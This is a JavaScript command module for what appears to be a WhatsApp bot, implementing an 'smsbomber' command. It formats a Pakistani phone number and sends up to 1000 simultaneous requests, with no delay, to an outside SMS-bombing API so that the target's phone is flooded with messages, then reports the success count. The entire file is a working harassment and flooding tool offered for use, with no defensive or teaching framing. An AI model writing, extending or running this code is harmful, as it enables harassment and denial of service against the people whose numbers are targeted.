const axios = require('axios');

module.exports = {
    command: 'smsbomber',
    aliases: ['bomb', 'smasher'],
    category: 'tools',
    description: 'Send multiple SMS to a Pakistani number (no delay, direct attack)',
    usage: '.smsbomber 3001234567 [quantity]',
    async handler(sock, message, args, context) {
        const chatId = context.chatId;
        const senderId = context.senderId;

        // Extract number and optional quantity
        let number = args[0];
        if (!number) {
            return await sock.sendMessage(chatId, {
                text: '❌ Please provide a phone number.\nExample: .smsbomber 3001234567 100',
                ...context.channelInfo
            }, { quoted: message });
        }

        // Clean number: remove non-digits
        number = number.replace(/\D/g, '');

        // Format to 92xxxxxxxxxx (12 digits)
        if (number.length === 10) {
            number = '92' + number;
        } else if (number.length === 12 && number.startsWith('92')) {
            // already correct
        } else if (number.length === 13 && number.startsWith('92')) {
            // possibly with leading zero? e.g., 92030... -> remove extra 0
            number = '92' + number.slice(3); // if 920301234567 -> 92301234567
        } else {
            return await sock.sendMessage(chatId, {
                text: '❌ Invalid number. Provide a 10-digit Pakistani number or full 12-digit number starting with 92.\nExample: .smsbomber 3001234567',
                ...context.channelInfo
            }, { quoted: message });
        }

        // Quantity: default 50, max 1000 to avoid abuse (adjust as needed)
        let quantity = 50;
        if (args[1] && !isNaN(parseInt(args[1]))) {
            quantity = parseInt(args[1]);
            if (quantity < 1) quantity = 1;
            if (quantity > 1000) quantity = 1000; // safety cap
        }

        // Confirm start
        await sock.sendMessage(chatId, {
            text: `💣 *SMS Bomber Started*\nTarget: +${number}\nSMS Count: ${quantity}\n\n⏳ Sending with *zero delay*...`,
            ...context.channelInfo
        }, { quoted: message });

        // Prepare all requests
        const apiUrl = 'https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php';
        const requests = [];
        for (let i = 0; i < quantity; i++) {
            requests.push(
                axios.get(apiUrl, {
                    params: { number },
                    timeout: 15000 // 15 seconds timeout per request
                }).then(res => ({
                    success: res.data?.status === 'success',
                    data: res.data
                })).catch(err => ({
                    success: false,
                    error: err.message
                }))
            );
        }

        // Execute all requests concurrently (no delay between them)
        const results = await Promise.allSettled(requests);

        // Count results
        let successCount = 0;
        let failCount = 0;
        results.forEach(result => {
            if (result.status === 'fulfilled' && result.value.success) {
                successCount++;
            } else {
                failCount++;
            }
        });

        // Send final report
        await sock.sendMessage(chatId, {
            text: `✅ *SMS Bombing Complete*\n\nTarget: +${number}\nRequested: ${quantity}\nSuccess: ${successCount}\nFailed: ${failCount}`,
            ...context.channelInfo
        });
    }
};
